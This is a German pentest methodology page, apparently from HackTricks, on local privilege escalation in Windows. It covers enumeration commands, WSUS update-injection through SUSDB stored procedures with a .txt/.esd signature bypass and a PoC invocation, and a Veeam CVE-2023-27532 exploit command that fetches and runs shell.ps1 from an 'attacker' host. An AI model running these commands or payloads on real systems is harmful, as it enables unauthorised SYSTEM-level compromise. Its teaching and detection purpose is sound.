# Lokale Rechteausweitung unter Windows

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Finden von Vektoren für die lokale Rechteausweitung unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Rechteausweitung unter Windows aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration basiert außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Rechteausweitung unter Windows.<sup>[[5]](#references)</sup>

Für einen kompakten Überblick verwende die [Checkliste zur lokalen Rechteausweitung](../checklist-windows-privilege-escalation.md).

## Windows-Grundlagen

### Zugriffstoken

**Wenn du nicht weißt, was Windows-Zugriffstoken sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn du nicht weißt, was Integritätsstufen unter Windows sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Unter Windows gibt es verschiedene Mechanismen, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien zu starten oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und alle diese **Abwehrmechanismen enumerieren**, bevor du mit der Enumeration zur Rechteausweitung beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann auch dazu genutzt werden, eine Offline-Änderung des UEFI-NVRAM mit Pre-Boot-DMA und einer Windows-`SYSTEM`-Speicher-Patching-Kette zu verbinden:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

Über `RAiLaunchAdminProcess` gestartete UIAccess-Prozesse können missbraucht werden, um ohne Aufforderungen High IL zu erreichen, wenn die sicheren Pfadprüfungen von AppInfo umgangen werden. Den speziellen Workflow zur Umgehung von UIAccess/Admin Protection findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Weitergabe von Registrierungseinträgen für Barrierefreiheit über den Secure Desktop kann für einen beliebigen SYSTEM-Registrierungsschreibzugriff (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Aktuelle Windows-Builds bieten außerdem einen **SMB arbitrary-port**-Pfad zur LPE, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

Für eine lokale Bestandsaufnahme aus einer vorhandenen PowerShell-Sitzung siehe [Windows-Enumeration mit .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Diese Beispiele ergänzen die folgenden Prüfungen, ohne separate Enumeration-Programme zu starten.

### Enumeration von Versionsinformationen

Prüfe, ob für die Windows-Version bekannte Schwachstellen existieren (prüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen zu Sicherheitslücken in Microsoft-Produkten zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt damit die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas enthält watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte potenziell relevante Advisories; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Prüfe bei einem versionsspezifischen lokalen Exploit sowohl die **Architektur des laufenden Prozesses** als auch die OS-Architektur. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein möglicher fehlender KB-Updateeintrag beweist nicht, dass ein Exploit funktioniert. Vergleiche den laufenden Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Voraussetzungen des Exploits mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) für das konkrete Problem.

Ein Beispiel für eine Speicherbeschädigung in einem Dienst findest du unter [vom Client kontrollierte Offsets im MIDI-Shared-Memory-Ring](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Die veröffentlichten Stack-Offsets gelten nur für den getesteten Build; `LOCAL SERVICE` zu erreichen, ist nicht dasselbe wie der spätere Schritt zu `SYSTEM` über [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md).<sup>[[44]](#references)</sup>

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Zugangsdaten oder Juicy-Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Eine beschreibbare [PowerShell profile](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) ist ein separater Ansatzpunkt für die Ausführung beim Start. Prüfe, ob ein Benutzer mit höheren Berechtigungen dieses Profil tatsächlich lädt, bevor du es als Privilege Escalation einstufst.

### PowerShell-Transkriptdateien

Hier erfährst du, wie du diese Funktion aktivierst: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell-Transkriptionsrichtlinie](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) speichert Dateien normalerweise im Ordner „Dokumente“ des jeweiligen Benutzers. Eine Einstellung für `OutputDirectory` oder `Start-Transcript -OutputDirectory` kann die Dateien jedoch in einen freigegebenen oder versteckten Ordner umleiten. Prüfen Sie den effektiven Ausgabepfad und die Datei-ACL, bevor Sie ein Transkript überprüfen: Es kann Befehlsargumente und Ausgaben enthalten, darunter auch Zugangsdaten. Ein lesbares Transkript ist nur dann ein Ansatzpunkt, wenn sein Inhalt eine nutzbare Identität mit höheren Berechtigungen offenlegt und sich diese Identität im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden protokolliert. Dazu gehören ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, folgen Sie den Anweisungen im Abschnitt „Transkriptdateien“ der Dokumentation und wählen Sie **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowerShell-Protokollen anzuzeigen, können Sie Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Eine vollständige Aufzeichnung der Aktivitäten und des gesamten Inhalts der Skriptausführung wird erfasst, sodass jeder Codeblock während der Ausführung dokumentiert wird. Dadurch bleibt ein umfassender Audit-Trail aller Aktivitäten erhalten, der für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung liefert detaillierte Einblicke in den Prozess.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Die Logging-Ereignisse für den Script Block findest du in der Windows-Ereignisanzeige unter **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, kannst du Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Die frühere Anleitung fasste das Risiko wie folgt zusammen:

Sie können das System kompromittieren, wenn Updates nicht über http**S**, sondern über http angefordert werden.

Ein HTTP-WSUS-Endpunkt ist ein Ansatzpunkt zur Prüfung, ob Update-Metadaten abgefangen werden können. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien auf dem Client gelten. Die URL allein belegt keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prüfen Sie zunächst, ob das Netzwerk WSUS-Updates ohne SSL verwendet, indem Sie Folgendes in cmd ausführen:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Die ursprüngliche Aussage zur Anwendbarkeit lautete:

Dann **ist die Schwachstelle ausnutzbar.** Wenn der letzte Registry-Wert gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Wenn `UseWUServer` auf `1` gesetzt ist, verwendet Windows Update den konfigurierten Intranetdienst. Damit ist eine Voraussetzung für den HTTP-Interception-Pfad bestätigt. Es ist jedoch kein Beweis dafür, dass Interception, die Annahme eines schädlichen Updates oder dessen Installation mit erhöhten Rechten möglich ist. Wenn der Wert auf `0` gesetzt ist, wird dieser konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, kannst du Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden. Dabei handelt es sich um mit MiTM-Funktionen ausgestattete Exploit-Scripts, mit denen sich über nicht per SSL geschützten WSUS-Datenverkehr „gefälschte“ Updates einschleusen lassen.

Lies hier die Recherche:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen wird bei diesem Bug folgende Schwachstelle ausgenutzt:

> Wenn wir unseren lokalen Benutzer-Proxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, unseren eigenen Datenverkehr abfangen und auf unserem System Code als Benutzer mit erhöhten Rechten ausführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, nutzt er auch dessen Zertifikatspeicher. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses Zertifikat zum Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine „Trust on First Use“-Validierung des Zertifikats umzusetzen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.

Du kannst diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht ist).

### Durch WSUS-Administratoren kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfe die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie alle delegierten WSUS-Berechtigungen. Ermittle anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Laut Microsoft sind WSUS-Administratorrechte erforderlich, um Updates zu genehmigen](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), und [Microsoft dokumentiert die Vertrauensbeziehung beim Veröffentlichen](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Prüfe, ob das betreffende Update signiert und akzeptiert wird, für das Ziel anwendbar ist und in einem privilegierteren Kontext installiert wird, bevor du dies als Privilegienausweitungspfad betrachtest. Ein HTTP-`WUServer`-Wert oder ein Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter Updates über SUSDB: nicht signierte Payloads via `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die **gespeicherten Prozeduren der WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstieg ist das Relaying des Computerkontos eines Upstream-WSUS-Servers an einen separaten MSSQL-Server, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der jeweiligen Bereitstellung ab. Ermittle daher zunächst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, findest du unter [Missbrauch von WSUS HTTP für NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Relay über eine externe Datenbank und Prozedurberechtigungen prüfen

Bei Bereitstellungen, in denen WSUS einen externen SQL Server verwendet, prüfe zuerst, ob sich das WSUS-Serverkonto bei der Datenbank authentifizieren kann und ob NTLM relay den entsprechenden Listener erreicht. Die SQL-Rolle des Servers kann Prozeduren zum Veröffentlichen von Updates verfügbar machen, selbst wenn direkte Schreibvorgänge in Tabellen verweigert werden. Ein fehlgeschlagenes `UPDATE` auf `SUSDB` belegt nicht, dass das Veröffentlichen blockiert ist. Prüfe in einer autorisierten SQL-Sitzung die effektive Identität, die Rollenmitgliedschaft und die Prozedurberechtigungen, bevor du ein benutzerdefiniertes Update ausprobierst.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die Live-Prozedurdefinitionen und die installierte `SoftwareDistributionPackage.xsd` sind nützlich, um gültige Update-Metadaten zu rekonstruieren. Sowohl ein Bundle-Parent als auch ein Payload-Child benötigen `UpdateIdentity` (Fragmenttyp `1`), `LocalizedProperties` (`4`) und `ExtendedProperties` (`2`). Erfasse die lokale Revisions-ID, die jeder Aufruf von `spImportUpdate` zurückgibt, und halte die Bundle-Beziehung, Digests, Größe, Content-URL und Revision konsistent. Dies ist ein zustandsbehafteter Publishing-Workflow. Ein einzelner erfolgreicher Aufruf einer gespeicherten Prozedur beweist nicht, dass die clientseitige Ausführung erfolgt ist.<sup>[[38]](#references)</sup>

#### Update erstellen, Ziel festlegen und genehmigen

Der Custom-Update-Workflow nutzt legitime WSUS-Prozeduren als eingeschränkte Publishing-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzungen sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Content-Digest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem du die Content-URL und die Zielgruppe zugewiesen hast, sieht die abschließende Genehmigung etwa wie folgt aus. Verwende neue Update-, Gruppen- und Deployment-IDs, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Durch Dateierweiterungen gesteuerter Signatur-Bypass

WSUS weist beliebige unsignierte ausführbare Inhalte normalerweise zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` jedoch das Zertifikatsprüfungs-Flag auf false, wenn der übergebene Dateiname mit `.txt` oder `.esd` endet. Dadurch wird `CheckCertificateSignature` übersprungen, ohne zuvor zu prüfen, ob es sich bei den Bytes um Text oder ein legitimes ESD-Image handelt. Eine unveränderte PE-Datei namens beispielsweise `payload.exe.txt` kann daher die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Policy-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Der Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprung muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen anfänglichen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung verursacht das WSUS-Synchronisierungsereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zur Ausführung und wird mit `BitsWebServer.py` für das Content-Staging ausgeliefert. Ein minimaler Aufruf in einem autorisierten Lab ist:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Wiederholungs-Persistenz

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, bewirkt, dass ein genehmigtes Update heruntergeladen und zum konfigurierten Zeitpunkt installiert wird, ohne dass der Benutzer es manuell auswählen muss. Beim Testen wurde ein Payload, dessen Update weiterhin als fehlgeschlagen/unvollständig galt, sofort erneut angeboten, nachdem der Callback-Prozess beendet wurde. Das Wiederholungsverhalten kann so zu einer wiederkehrenden Ausführungs-Persistenz werden; sie ist auffällig, weil der Client einen fehlgeschlagenen Update-Status anzeigt.<sup>[[39]](#references)</sup>

#### Erkennungs- und Hardening-Ansatzpunkte

Nützliche server- und clientseitige Ansatzpunkte aus dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Targeting-Gruppen, externe Content-Ursprünge, Update-Payloads mit `.txt`/`.esd` sowie Deployments durch unerwartete Principals untersuchen (insbesondere Nicht-Computerkonten).
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, den Schreibfehler `FileVerficationFailed` und `EventId=364` überprüfen; Verifizierung mit Payload-Erweiterung und Content-Magic korrelieren, statt dem Suffix zu vertrauen.
- Nach wiederholt fehlschlagenden/wiederholten Windows-Update-Installationen sowie nach PE-Ausführung oder unerwarteten Child-/Netzwerkaktivitäten von Content mit `.txt`- oder `.esd`-Namen suchen.
- Extended Protection for Authentication für den Datenbankdienst aktivieren, sofern unterstützt, und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Berechtigungen für die benutzerdefinierten Update-Prozeduren minimieren und überwachen.

## Auto-Updater von Drittanbietern und Agent-IPC (lokale privesc)

Viele Enterprise-Agents stellen eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal bereit. Wenn die Registrierung zu einem Angreifer-Server gezwungen werden kann und der Updater einer gefälschten Root-CA oder schwachen Signer-Prüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) ist hier beschrieben:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Die ursprüngliche versionsspezifische Beschreibung und der Reconnaissance-Hinweis lauteten:

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und so beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Recon**: Listener und Version bestätigen, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Advisory](https://www.veeam.com/kb4424) beschreibt die unauthentifizierte Offenlegung verschlüsselter Anmeldedaten der Konfigurationsdatenbank innerhalb des Perimeters des Backup-Netzwerks; ein separater öffentlicher PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst bindet möglicherweise nicht nur an localhost. Prüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: Bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie Patch-Metadaten überprüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Hinweise, aber keine vollständige Patch-Prüfung.
- **Mindestversionen mit Fix**: Veeam nennt **11a Build 11.0.1.1261 P20230227** und **12 Build 12.0.0.1420 P20230223** als erste Versionen mit Fix; frühere Releases sind betroffen. Anhand einer vierteiligen Dateiversion allein lässt sich ein ungepatchter Basis-Build nicht von einem späteren Patch auf denselben Build-Nummern unterscheiden. Vor der Einstufung eines Grenz-Builds als behoben die Patch-Kennung anhand der [Build-Historie des Herstellers](https://www.veeam.com/kb2680) überprüfen.
- **Exploit**: Einen PoC wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis ablegen und anschließend einen SYSTEM-Payload über den lokalen Socket auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der Dienst führt den Befehl als SYSTEM aus.

Der zitierte PoC demonstriert die Befehlsausführung als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Anbieters beschreibt das Problem der Offenlegung von Anmeldedaten.

## KrbRelayUp

Die ursprüngliche Beschreibung der Standardumgebung lautete:

In Windows-**Domänen**umgebungen besteht unter bestimmten Bedingungen eine Sicherheitslücke zur **lokalen Rechteausweitung**. Zu diesen Bedingungen zählen Umgebungen, in denen **LDAP signing nicht erzwungen wird,** Benutzer über eigene Rechte verfügen, mit denen sie **Resource-Based Constrained Delegation (RBCD)** konfigurieren können, und Benutzer Computer in der Domäne erstellen können. Wichtig ist, dass diese **Voraussetzungen** mit **Standardeinstellungen** erfüllt sind.

Ein lokaler Kerberos-Relay kann einen Anmeldevorgang mit geringeren Berechtigungen in einen privilegierten Verzeichnisschreibzugriff umwandeln, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Sicherheitsprinzipal über Rechte auf das Zielobjekt verfügt. [KrbRelay](https://github.com/cube0x0/KrbRelay) dokumentiert sowohl LDAP-Schreibvorgänge für RBCD als auch für `msDS-KeyCredentialLink` (Shadow-Credential); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette erfordert passende Delegierungs- und Zielobjektrechte, während eine Shadow-Credential-Kette Schreibrechte für Schlüsselanmeldedaten sowie einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner der beiden Pfade ergibt sich allein aus der Mitgliedschaft in einer Domäne.

